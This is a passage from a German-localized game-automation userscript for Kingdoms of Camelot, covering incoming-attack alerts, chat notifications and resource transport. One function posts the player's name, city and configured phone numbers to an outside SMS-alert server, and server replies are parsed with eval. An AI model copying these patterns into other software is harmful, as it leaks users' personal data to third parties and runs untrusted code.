      document.getElementById('pbattackqueue_' + cId).value = 'A ' + t['attackCount_' + cId] + ' | S ' + t['scoutCount_' + cId];
    }
  
  },   
  
  e_soundFinished : function (chan){ // called by SWF when sound finishes playing
  var t = Tabs.tower;
  if (chan != 1)
    return;
  if (!Options.alertSound.alarmActive){
    document.getElementById('pbSoundStop').disabled = true;
  }
  },

  e_soundFileLoaded : function (chan, isError){ // called by SWF when sound file finishes loading
  if (chan != 1)
    return;
  if (isError)  
    document.getElementById('pbLoadStat').innerHTML = ''+culang.error+'!';
  else
    document.getElementById('pbLoadStat').innerHTML = ''+culang.done+'!';
  },  
  
  playSound : function (doRepeats){
  var t = Tabs.tower;
  document.getElementById('pbSoundStop').disabled = false;
  clearTimeout (t.soundStopTimer);
  clearTimeout (t.soundRepeatTimer);
  t.mss.play (1, 0);
  t.soundStopTimer = setTimeout (function(){t.mss.stop(1); t.e_soundFinished(1)}, Options.alertSound.playLength*1000);
  if (doRepeats && Options.alertSound.repeat)
    t.soundRepeatTimer = setTimeout (function (){t.playSound(true)}, Options.alertSound.repeatDelay*60000);
  else
    Options.alertSound.alarmActive = false;
  },
    
  soundTheAlert : function (){
  var t = Tabs.tower;
  Options.alertSound.alarmActive = true;
  t.playSound(true);
  },
   
stopSoundAlerts : function (){
	var t = Tabs.tower;
	obj = document.getElementById('pbSoundStop');
	t.mss.stop (1);
	clearTimeout (t.soundStopTimer);
	clearTimeout (t.soundRepeatTimer);
	document.getElementById('pbSoundStop').disabled = true;
	Options.alertSound.alarmActive = false;
	Options.alertSound.expireTime = 0;
	if (Options.scStopSound) {
		createRedButton(''+culang.stopsound+'', 'pbtowertab');
	}
},
newIncoming : function (m){
  var t = Tabs.tower;
   t.postToChat (m);
},
sendalert : function (m){
var t = Tabs.tower;
  var now = unixTime();
  if (Options.celltext.atext)
   t.postToCell (m);
  if (Options.alertSound.enabled){
    t.soundTheAlert(m);
    if (m.arrivalTime > Options.alertSound.expireTime)
    Options.alertSound.expireTime = m.arrivalTime;
  }
if (Options.alertConfig.raid){
 			Tabs.Raid.StopCityRaids(m.toCityId);
 			Options.alertConfig.raidautoswitch[m.toCityId] = true;
		}
  },

  ajaxSetDefMode : function (cityId, state, notify){
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.cid = cityId;
  params.state = state;
  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
    method: "post",
    parameters: params,
    onSuccess: function (rslt) {
    if (rslt.ok) {
      Seed.citystats["city" + cityId].gate = state;
      notify (state);
    }
    },
    onFailure: function () {
    }
  })
  },
  
  onUnload : function (){
  },
  postToCell : function (m){
 var t = Tabs.tower;
 var data = {};
 if (m.marchType == null) // bogus march (returning scouts)
 return;
 if (m.marchType == 3){
 if (!Options.alertConfig.scouting)
 return;
 data.atkType = 'SPAEHEN';
 } else if (m.marchType == 4){
 data.atkType = 'ANGRIFF';
 } else {
 return;
 }
 var city = Cities.byID[m.toCityId];
 if ( city.tileId == m.toTileId )
 data.target = 'HEILIGTUM ('+ city.x +','+ city.y+')';
 else {
 if (!Options.alertConfig.wilds)
 return;
 data.target = 'WILDNISS';
 for (k in Seed.wilderness['city'+m.toCityId]){
 if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
 data.target += Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
 break;
 }
 }
 }
 if (Seed.players['u'+m.pid])
 data.who = Seed.players['u'+m.pid].n;
 else if (m.players && m.players['u'+m.pid])
 data.who = m.players['u'+m.pid].n;
 else
 data.who = ''+culang.botStatUnknown+'';

 if (m.fromXCoord)
 data.who += m.fromXCoord +','+ m.fromYCoord;
 data.arrival = unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime()));
 var totTroops = 0;
 data.totTroops = ' '
 for (k in m.unts){
 var uid = parseInt(k.substr (1));
 data.totTroops += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
 totTroops += m.unts[k];
 }
 if (totTroops < Options.alertConfig.minTroops)
 return;

 if ( city.tileId == m.toTileId ){
 var emb = getCityBuilding(m.toCityId, 8);
 if (emb.count > 0){
 var availSlots = emb.maxLevel;
 for (k in Seed.queue_atkinc){
 if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
 --availSlots;
 }
 }
 data.embassy = 'BOTSCHAFT '+ availSlots +' '+culang.from+' '+ emb.maxLevel;
 if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
 {
 data.stat = 'VERSTECKT';
 }
 if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
 {
 data.stat = 'VERTEIDIGEN';
 }
 }
 }
 data.provider = Options.celltext.provider;
 data.num1 = Options.celltext.num1;
 data.num2 = Options.celltext.num2;
 data.num3 = Options.celltext.num3;
 data.serverId = getServerId();
 data.player = Seed.player['name'];
 data.city = city.name;

 GM_xmlhttpRequest({
 method: 'POST',
 url: 'http://hs151.digitalweb.net/index.php',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 },
 data: implodeUrlArgs(data),

 })
},

postToChat : function (m){
  var t = Tabs.tower;
  if (DEBUG_TRACE) logit ("checkTower(): INCOMING at "+ unixTime()  +": \n"+ inspect (m, 8, 1));
  if (m.marchType == null)      // bogus march (returning scouts)
    return;
  if (ENABLE_TEST_TAB) Tabs.F.addDiv ("ACHTUNG!<BR><PRE style='margin:0px;'>" + inspect (m, 8, 1) +'</pre>');
  if (m.marchType == 3){
    if (!Options.alertConfig.scouting)
    return;
    atkType = ''+culang.pTcScouted+'';
  } else if (m.marchType == 4){
    atkType = ''+culang.pTcack+'';
  } else {
    return;
  }
  var target, HideDefendFlag, atkType, who, attackerMight, allianceId;
    var city = Cities.byID[m.toCityId];
    HideDefendFlag = '';
    if ( city.tileId == m.toTileId ) {
      target = ''+culang.holyplace+' ';
      if (Options.includeCityName)
        target += ' ' + city.name +',';
      target += ' '+culang.at+' '+ city.x +','+ city.y;
      if (defMode[m.toCityId] == 0)
        HideDefendFlag = ' = '+Options.hideMessage+'!';
      if (defMode[m.toCityId] == 1)
        HideDefendFlag = ' = '+Options.defendMessage+'!';
    }
    else {
    if (!Options.alertConfig.wilds)
    return;
    target = ''+culang.pTcwild+'';
    for (k in Seed.wilderness['city'+m.toCityId]){
    if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
      target += ' '+culang.at+' '+ Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
      break;
    }
    }
  }
  if (Seed.players['u'+m.pid])
    who = Seed.players['u'+m.pid].n;
  else if (m.players && m.players['u'+m.pid])
    who = m.players['u'+m.pid].n;
  else
    who = 'Unknown';
    if (Seed.players['u' + m.pid]) {
      who = Seed.players['u' + m.pid].n;
      attackerMight = parseInt(Seed.players['u' + m.pid].m);
      allianceId = parseInt(Seed.players['u' + m.pid].a);
    } else if (m.players && m.players['u' + m.pid]) {
        who = m.players['u' + m.pid].n;
        attackerMight = parseInt(m.players['u' + m.pid].m);
        allianceId = parseInt(m.players['u' + m.pid].a);
    } else
        who = 'Unknown';
  var might = '';
    var alliance = '';
    if (who != 'Unknown') {
      if(Options.includeMight)
        might = ' '+culang.might+': ' + addCommas(attackerMight);
      if (Options.includeAlliance)
        alliance = ' ('+getDiplomacy(allianceId)+')'; // Seed.allianceNames[allianceId] no longer returns alliance name
    }
  if (m.fromXCoord)
      who += ' '+culang.at+' '+ m.fromXCoord +','+ m.fromYCoord;
	  who += ' ('+getDiplomacy(m.aid)+')';
    var msg = Options.alertConfig.aPrefix + ' ';
  //  msg += 'Ziel '+ target +' wird '+ atkType  +' von '+ who + alliance + might + ' ' + HideDefendFlag + ' (Ankunft in '+
    //    unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') = ';
    if(m.marchStatus == 9)
	msg += ' '+ atkType +' '+culang.wascall+' '+ target +' '+culang.from+' '+ who +'';
	else
	msg += ''+culang.target+' '+ target +' '+culang.where+' '+ atkType  +' '+culang.from+' '+ who + alliance + might + ' ' + HideDefendFlag + ' ('+culang.pTcarive+' '+ unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') : ';
	var totTroops = 0;
    for (k in m.unts){
      var uid = parseInt(k.substr (1));
      msg += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
      totTroops += m.unts[k];
    }
    if (totTroops < Options.alertConfig.minTroops)
      return;
    msg = msg.slice (0, -2);
    msg += '.';
    if ( city.tileId == m.toTileId ){
      var emb = getCityBuilding(m.toCityId, 8);
      if (emb.count == 0)
	  msg += ' '+culang.nobuildEmbassy+'';
	  else {
        var availSlots = emb.maxLevel;
        for (k in Seed.queue_atkinc){
          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
            --availSlots;
          }
        }
    msg += ' = '+culang.pTcemb+' '+ availSlots +' '+culang.pTcemb2+' '+ emb.maxLevel +' '+culang.pTcemb3+' ';
     if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
    {
      msg+= ' = '+Options.hideMessage+'! ';
    }
    if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
    {
      msg+= ' = '+Options.defendMessage+'! ';
    }
    }
  }
  t.sendalert(m);
    if (!Options.alertConfig.aChat) return;
  if (ENABLE_TEST_TAB) Tabs.F.addDiv (msg);
  if (SEND_ALERT_AS_WHISPER)
    sendChat ("/"+ Seed.player.name +' '+ msg);    // Whisper to myself
  else
    sendChat ("/a "+  msg);                        // Alliance chat
  },
    handleTowerData: function(m){
    var t = Tabs.tower;
    var now = unixTime();
    var target, atkType, who, attackermight, allianceId, allianceName, diplomacy;
    var city = Cities.byID[m.toCityId];
    
    if (DEBUG_TRACE)
      logit("checkTower(): INCOMING at " + unixTime() + ": \n" + inspect(m, 8, 1));
    
    //ATKTYPE
    if (m.marchType == 3) {
      atkType = ''+culang.pTcScouted+'';
      t['scoutCount_' + m.toCityId]++;
    }
    else
      if (m.marchType == 4) {
        atkType = ''+culang.pTcack+'';
        t['attackCount_' + m.toCityId]++;
      }
      else {
        return;
      }
    //TARGET
    if (city.tileId == m.toTileId)
      target = ''+culang.pTcityat+' ' + city.x + ',' + city.y;
    else {
      target = ''+culang.wild+'';
      for (k in Seed.wilderness['city' + m.toCityId]) {
        if (Seed.wilderness['city' + m.toCityId][k].tileId == m.toTileId) {
          target += ' '+culang.at+' ' + Seed.wilderness['city' + m.toCityId][k].xCoord + ',' + Seed.wilderness['city' + m.toCityId][k].yCoord;
          break;
        }
      }
    }
    //CITYNAME
    var cityName = Cities.byID[m.toCityId].name;
    
    //TROOPS
    var units = [];
    for (i = 0; i < 13; i++)
      units[i] = 0;
    for (k in m.unts) {
      var uid = parseInt(k.substr(1));
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrsupply)
        units[1] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrmilitiaman)
        units[2] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.scout)
        units[3] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrpikeman)
        units[4] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrswordsman)
        units[5] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrtarcher)
        units[6] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrcavalry)
        units[7] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrheavycavalry)
        units[8] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrsupplywagon)
        units[9] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.ballista)
        units[10] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrbatteringram)
        units[11] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.catapult)
        units[12] = m.unts[k];
    }
    //ATTACKERS INFORMATION
    if (Seed.players['u' + m.pid]) {
      who = Seed.players['u' + m.pid].n;
      attackermight = Seed.players['u' + m.pid].m;
      allianceId = Seed.players['u' + m.pid].a;
      allianceName = Seed.allianceNames[allianceId];
      diplomacy = getDiplomacy(allianceId);
    }
    else
      if (m.players && m.players['u' + m.pid]) {
        who = m.players['u' + m.pid].n;
        attackermight = parseInt(m.players['u' + m.pid].m);
        allianceId = 'a' + m.players['u' + m.pid].a;
        allianceName = Seed.allianceNames[allianceId];
        diplomacy = getDiplomacy(allianceId);
      }
      else {
        who = 'n.A.';
        attackermight = 'n.A.';
        allianceId = 'n.A.';
        allianceName = 'n.A.';
        diplomacy = 'n.A.';
      }
  //SOURCE
    if (m.fromXCoord)
      var source = m.fromXCoord + ',' + m.fromYCoord;
    else
      var source = 'n.A.';
    
    var arrivingDatetime = new Date();
    arrivingDatetime.setTime(m.arrivalTime * 1000);
    var count = t.towerMarches.length + 1;
    t.towerMarches[count] = {
      added: now,
      cityId: m.toCityId,
      target: target,
      arrival: parseIntNan(m.arrivalTime),
      atkType: atkType,
      who: who,
      attackermight: attackermight,
      allianceName: allianceName,
      diplomacy: diplomacy,
      rtime: unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())),
      arrivingDatetime: arrivingDatetime,
    source:source,
      units: units,
    };
  },
  showTowerIncoming: function(cityId){
    var t = Tabs.tower;
    var popTowerIncoming = null;
    var cityName = Tabs.build.getCityNameById(cityId);
    
    if (t.popTowerIncoming == null) {
      t.popTowerIncoming = new CPopup('pbtower_' + cityId, 0, 0, 746, 100, true, function() {clearTimeout (t.timer);});
    }
    t.popTowerIncoming.show(false);
    var m = '<DIV style="max-height:660px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pdxTabPad" id="pbCityTowerContent">';
    t.popTowerIncoming.getMainDiv().innerHTML = '</table></div>' + m;
    t.popTowerIncoming.getTopDiv().innerHTML = '<span class=showBadged>'+culang.pTcTrpt+' ' + cityName + '</span>';
    t.addCityData2Pop(cityId);
    t.popTowerIncoming.show(true);
  clearTimeout (t.timer);
  t.timer = setTimeout (function() {t.showTowerIncoming(cityId)}, 5000);        
  },
  addCityData2Pop: function(cityId){
    var t = Tabs.tower;
    var rownum = 0;
    var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
    enc = {};
    numSlots = 0;
    var row = document.getElementById('pbCityTowerContent').innerHTML = "";
    if (matTypeof(Seed.queue_atkinc) != 'array') {
      for (k in Seed.queue_atkinc) {
        march = Seed.queue_atkinc[k];
        if (march.marchType == 2) {
          ++numSlots;
          city = march.toCityId;
          from = march.fromPlayerId;
      if (!enc[city])
            enc[city] = {};
          if (!enc[city][from])
            enc[city][from] = [];
          k = [];
          k[0] = parseInt(march.knightCombat);
          for (i = 1; i < 13; i++) {
            if (Options.encRemaining)
              k[i] = parseInt(march['unit' + i + 'Return']);
            else
              k[i] = parseInt(march['unit' + i + 'Count']);
          }
      k[14] = parseInt(march.marchStatus);
      var now = unixTime();
      k[15] = parseInt(march.destinationUnixTime) - now;
          enc[city][from].push(k);
        }
      }
    }
	var s1 = '';
	var s2 = '';
	var s3 = '';
	var tot = [];
	var atk = [];
	for (i = 0; i < 13; i++) {
	tot[i] = 0;
	atk[i] = 0;
    }

      s1 += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;} .attack{background:#FF9999;} .own{background:#66FF66;}</style>';
      s1 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=center width=16%></td>';
      
      for (k = 0; k < names.length; k++)
        s1 += '<TD width=7%><B>' + names[k] + '</b></td>';
      s1 += '</tr>';
      dest = cityId;
      if (enc[dest]) {
        for (p in enc[dest]) {
          try {
            player = Seed.players['u' + p].n;
          }
          catch (err) {
            player = '???';
          }
          for (m = 0; m < enc[dest][p].length; m++) {
            /*knight = '';
            if (enc[dest][p][m][0] > 0)
              knight = ' (' + enc[dest][p][m][0] + ')';
      */
      status = '';
            if (enc[dest][p][m][14] == 1) {
        status = ' (' + timestr(enc[dest][p][m][15]) + ')';  
        if (enc[dest][p][m][15] < 0)
        status = ' (enc)';  
        else
         status = ' (' + timestr(enc[dest][p][m][15]) + ')';  
      }
      if (enc[dest][p][m][14] == 2) {
        status = ' (enc)';  
      }
  s1 += '<TR align=right><TD align=left class="city">' + player + status +'</td>'
          for (i = 1; i < 13; i++) {
            num = enc[dest][p][m][i];
            s1 += '<TD class="city">' + thouormil(num) + '</td>';
            tot[i] += num;

            }
            //s1 += '<TD><INPUT id=sendhome_' + numSlots + ' type=submit value="Home" style="border:1px solid black; background-color:red;"></td></tr>';
          }
        }
      } else {
        s1 += '<TR align=right><TD align=left class="city"><B>'+culang.rptreinforce+':</b></td>'
        for (i = 1; i < 13; i++) {
          s1 += '<TD class="city">0</td>';
        }
        
      }
    s1 += '<TR align=right><TD colspan=14><BR></tr>';
      s1 += '<TR align=right><TD class="own" align=left><B>'+culang.owntrp+':</b></td>';
      //OWNTROOPS
      var ownTroops = "";
      for (r = 1; r < 13; r++) {
        cityString = 'city' + cityId;
        num = parseInt(Seed.units[cityString]['unt' + r]);
        //s1 += '<TD class="own">' + num + '</td>';
  s1 += '<TD class="own">' + thouormil(num) + '</td>';
        tot[r] += num;
      }
      s1 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>'+culang.defender+':</b></td>';
      for (i = 1; i < 13; i++)
s1 += '<TD class="tot">' + thouormil(tot[i]) + '</td>';
        //s1 += '<TD class="tot">' + tot[i] + '</td>';      
    s3 += '</tr></table>';
    
    s3 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>'+culang.inctrp+':</b></td>';
    
    var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
    if (t.towerMarches.length > 0) {
      for (k in t.towerMarches) {
        if (typeof t.towerMarches[k].atkType != 'undefined') {
          if (t.towerMarches[k].cityId == cityId) {
            s3 += '<TABLE cellspacing=0 width=100%><TR>';
            
            if (t.towerMarches[k].atkType == ''+culang.pTcack+'') {
              s3 += '<TD rowspan=2 width=5%><B><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></b></td>';
            }
            else
              if (t.towerMarches[k].atkType == ''+culang.pTcScouted+'') {
                s3 += '<TD rowspan=2 width=5%><B><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></b></td>';
              }
				s3 += '<TD width=15%  ><B>'+culang.coord+'</b></td>';
				s3 += '<TD width=15%  ><B>'+culang.name+'</b></td>';
				s3 += '<TD width=10%><B>'+culang.source+': </b></td><TD width=10%>' + t.towerMarches[k].source + '</td>';
				s3 += '<TD width=10%><B>'+culang.might+': </b></td><TD width=10%>' + t.towerMarches[k].attackermight + '</td>';
				s3 += '<TD width=10%><B>'+culang.alliance+': </b></td><TD width=10%>' + t.towerMarches[k].allianceName + '</td>';
				s3 += '<TD width=10%><B>'+culang.diplo+': </b></td><TD width=10%>' + t.towerMarches[k].diplomacy + '</td></tr>';
				s3 += '<TR><TD width=10%  >' + t.towerMarches[k].target + '</td>';
				s3 += '<TD  >' + t.towerMarches[k].who + '</td>';
				s3 += '<TD><B>'+culang.leftfor+': </b></td><TD width=10%>' + t.towerMarches[k].rtime + '</td>';
				s3 += '<TD><B>'+culang.arrival+': </b></td><TD  colspan=5 width=10%>' + t.towerMarches[k].arrivingDatetime + '</td></tr>';
				s3 += '</tr></table>';
				s3 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=left width=16%></td>';
				for (n = 0; n < names.length; n++)
				s3 += '<TD width=7%><B>' + names[n] + '</b></td>';
				s3 += '</tr><TR align=right><TD class="attack" align=left><B>'+culang.units+':</td>';
				for (u = 1; u < 13; u++) {
				num = t.towerMarches[k].units[u];
				s3 += '<TD class="attack">' + thouormil(num) + '</td>';
				//s3 += '<TD class="attack">' + num + '</td>';
              atk[u] += parseInt(num);
            }
      s3 += '</tr></table>';
          }
        }
        
      }
    }
  s2 += '<TR><TD colspan=14><BR></td></tr><TR align=right><TD class="attack" align=left><B>'+culang.victim+':</b></td>';
    for (a = 1; a < 13; a++)
s2 += '<TD class="attack" width=7%>' + thouormil(atk[a]) + '</td>';
      //s2 += '<TD class="attack" width=7%>' + atk[a] + '</td>';
  var html = s1 + s2 + s3;
    document.getElementById('pbCityTowerContent').innerHTML = html;

  },
  sendReinforcmentHome: function(){ //FUNCTION NOT IN USE YET BUT SOON :-)
    //mid, cid, fromUid, fromCid, upkeep
    var params = Object.clone(g_ajaxparams);
    params.mid = mid;
    params.cid = cid;
    params.fromUid = fromUid;
    params.fromCid = fromCid;
    new Ajax.Request(g_ajaxpath + "ajax/kickoutReinforcements.php" + g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function(transport){
        var rslt = eval("(" + transport.responseText + ")");
        if (rslt.ok) {
          Modal.showAlert(g_js_strings.kickout_allies.troopshome);
          seed.resources["city" + currentcityid].rec1[3] = parseInt(seed.resources["city" + currentcityid].rec1[3]) - upkeep;
          if (parseInt(fromUid) == parseInt(tvuid)) {
            var curmarch = seed.queue_atkp["city" + fromCid]["m" + mid];
            var marchtime = Math.abs(parseInt(curmarch.destinationUnixTime) - parseInt(curmarch.eventUnixTime));
            curmarch.returnUnixTime = unixTime() + marchtime;
            curmarch.marchStatus = 8
          }
          delete seed.queue_atkinc["m" + mid]
        }
        else {
          Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
        }
      },
      onFailure: function(){
      }
    })
  },
}
/***********************************************************************************/
/************ KOC POWER - TABS TRANSPORT ******************************************/
/*********************************************************************************/
Tabs.transport = {
  tabLabel: culang.transport,
  tabOrder: StyleOptions.toTransport,
  myDiv: null,
  timer: null,
  traderState: [],
  lTR: [],
  tradeRoutes: [],
  checkdotradetimeout: null,
  count:0,
  check:false,

	init: function(div){
	var t = Tabs.transport;
	t.myDiv = div;
	t.traderState = {running: false,};
	t.readTraderState();
	t.readTradeRoutes();
	t.e_tradeRoutes();


	  var m = '<DIV id=pbTowrtDivF class=pdxStat>'+culang.HaTrans+' - '+culang.Hsettings+'</div><TABLE id=pbtraderfunctions width=100% height=0% class=pdxTab><TR align="center">';
	  if (t.traderState.running == false) {
		  m += '<TD><INPUT id=pbTraderState type=submit value="'+culang.transport+' = '+culang.buttonoff+'"></td>';
	  } else {
		  m += '<TD><INPUT id=pbTraderState type=submit value="'+culang.transport+' = '+culang.buttonon+'"></td>';
	  }
		m += '<TD><INPUT id=pbShowRoutes type=submit value='+culang.tsroutes+'></td>';
		m += '</tr></table></div>';

		m += '<DIV id=pbTraderDivDRoute class=pdxStat>'+culang.HaTransR+' - '+culang.Hsettings+'</div>';
		m += '<TABLE id=pbtraderfunctions width=100% height=0% class=pdxTab><TR align="center"><TR align="left">';
		m += '<TD colspan=4>'+culang.transinter+' <INPUT id=pbtransportinterval type=text size=2 value="'+Options.transportinterval+'"\> '+culang.transinter2+'</td></tr></table>';
		m += '<TD colspan=4>'+culang.donttransif+' <INPUT id=pbminwagons type=text size=2 value="'+Options.minwagons+'"\> '+culang.donttransif2+'</td></tr></table>';
		m += '<DIV style="margin-top:10px;margin-bottom:5px;font-size:10px;color:#555;line-height:18px;"><span class=boldRed>'+culang.impo+'</span><b>:</b> '+culang.transimpnote+'</div></table>';
		m += '<TABLE id=pbaddtraderoute width=95% height=0% class=pdxTab><TR align="left">';
		m += '<TR align="left"><TD><b>'+culang.heiligtum+'</b>: </td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptrescity></span></div></td></tr>';
		m += '<DIV id=pbTraderDivDRoute class=pdxStat>'+culang.Htransp+'</div>';
		m += '<TR align="left">';
		m += '<TD><b>'+culang.bunker+'</b>:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptcityTo></span></div></td>';
		m += '<TD><u>'+culang.or+'</u> <b>'+culang.target+' '+culang.coord+'</b>:</td>';
		m += '<TD>X:<INPUT id=ptcityX type=text size=3\></td>';
		m += '<TD>Y:<INPUT id=ptcityY type=text size=3\></td></tr>';

		m += '<TR align="left">';

		m += '<TABLE id=pbaddtraderoute height=0% class=pdxTab><TR align="left">';
		m += '<TD width=75px><b>'+culang.troops+' '+culang.type+'</b>:</td><TD width=150px><SELECT id="TransportTroop">';
		for (y in unsafeWindow.unitcost) m+='<option value="'+y+'">'+unsafeWindow.unitcost[y][0]+'</option>';
		m+='</select></td><TD width=75px><b>'+culang.fortroops+'</b>:&nbsp;</td><TD id=TroopAmount align=left width=75px></td>';
		m+='<TD width=75px><b>'+culang.transglobal+' '+culang.transport+' '+culang.amount+'</b>:&nbsp;</td><TD id=CarryAmount align=left width=75px></td>';
		m += '<TR><TD ><b>'+culang.troops+'</b>: </td><TD><INPUT id=TroopsToSend type=text size=6 maxlength=6 value="0">&nbsp;&nbsp;<INPUT id=MaxTroops type=submit value="'+culang.max+'"></td>';
		m += '<TD width=50px><INPUT id=FillInMax type=submit value="<----"></td>';
		m +='<TD id=Calc colspan=3></td></tr>';
		m += '<TABLE id=pbaddtraderoute height=0% class=pdxTab><TR align="center">';
		   
		m += '<TD>&nbsp;</td>';
		m += '<TD align=right><u><b>'+culang.holyplace+'</b></td>';
		m += '<TD  align=right><u><b>'+culang.target+'</b></u></td>';
		m += '<TD align=right>&nbsp;</td>';
		m += '<TD  align=left>&nbsp;</td>';
		m += '<TD>&nbsp;</td>';
		m += '<TD>&nbsp;</td>';
		m += '</tr>';
		m += '<TR align="center">'; 
		m += '<TD width=5%><img src="http://koc.god-like.info/img/food_30.png"></td>';
		m += '<TD id=TransRec1 align=right width=110px></td>';
		m += '<TD id=HaveRec1 align=right width=110px></td>';
		m += '<TD width=55px align=right><INPUT id=pbshipFood type=checkbox unchecked=true\></td>';
		m += '<TD width=180px  align=left>'+culang.keep+': <INPUT id=pbtargetamountFood type=text size=11 maxlength=11 value="0" disabled=true\></td>';
		m += '<TD width=100px>'+culang.amount+': <INPUT id=pbtradeamountFood type=text size=11 maxlength=11 value="0"\></td>';
		m += '<TD width=50px><INPUT id=MaxFood type=submit value="'+culang.max+'"></td></tr>';
		m += '<TR align="center">';
		m += '<TD width=5%><img src="http://koc.god-like.info/img/wood_30.png"></td>';
		m += '<TD id=TransRec2 align=right width=110px></td>';
		m += '<TD id=HaveRec2 align=right width=110px></td>';
		m += '<TD width=55px align=right><INPUT id=pbshipWood type=checkbox unchecked=true\></td>';
		m += '<TD width=180px align=left>'+culang.keep+': <INPUT id=pbtargetamountWood type=text size=11 maxlength=11 value="0" disabled=true\></td>';
		m += '<TD width=100px>'+culang.amount+': <INPUT id=pbtradeamountWood type=text size=11 maxlength=11 value="0"\></td>';
		m += '<TD width=50px><INPUT id=MaxWood type=submit value="'+culang.max+'"></td></tr>';
		m += '<TR align="center">';
		m += '<TD width=5%><img src="http://koc.god-like.info/img/stone_30.png"></td>';
		m += '<TD id=TransRec3 align=right width=110px></td>';
		m += '<TD id=HaveRec3 align=right width=110px></td>';
		m += '<TD width=55px align=right><INPUT id=pbshipStone type=checkbox unchecked=true\></td>';
		m += '<TD width=180px>'+culang.keep+': <INPUT id=pbtargetamountStone type=text size=11 maxlength=11 value="0" disabled=true\></td>';
		m += '<TD width=100px>'+culang.amount+': <INPUT id=pbtradeamountStone type=text size=11 maxlength=11 value="0"\></td>';
		m += '<TD width=50px><INPUT id=MaxStone type=submit value="'+culang.max+'"></td></tr>';
		m += '<TR align="center">';
		m += '<TD width=5%><img src="http://koc.god-like.info/img/iron_30.png"></td>';
		m += '<TD id=TransRec4 align=right width=110px></td>';
		m += '<TD id=HaveRec4 align=right width=110px></td>';
		m += '<TD width=55px align=right><INPUT id=pbshipOre type=checkbox unchecked=true\></td>';
		m += '<TD width=180px align=left>'+culang.keep+': <INPUT id=pbtargetamountOre type=text size=11 maxlength=11 value="0" disabled=true\></td>';
		m += '<TD width=100px>'+culang.amount+': <INPUT id=pbtradeamountOre type=text size=11 maxlength=11 value="0"\></td>';
		m += '<TD width=50px><INPUT id=MaxOre type=submit value="'+culang.max+'"></td></tr>';
		
		m += '<TR align="center">';
		m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png"></td>';
		m += '<TD id=TransRec5 align=right width=110px></td>';
		m += '<TD id=HaveRec5 align=right width=110px></td>';
		m += '<TD width=55px align=right><INPUT id=pbshipAstone type=checkbox unchecked=true\></td>';
		m += '<TD width=180px align=left>'+culang.keep+': <INPUT id=pbtargetamountAstone type=text size=11 maxlength=11 value="0" disabled=true\></td>';
		m += '<TD width=100px>'+culang.amount+': <INPUT id=pbtradeamountAstone type=text size=11 maxlength=11 value="0"\></td>';
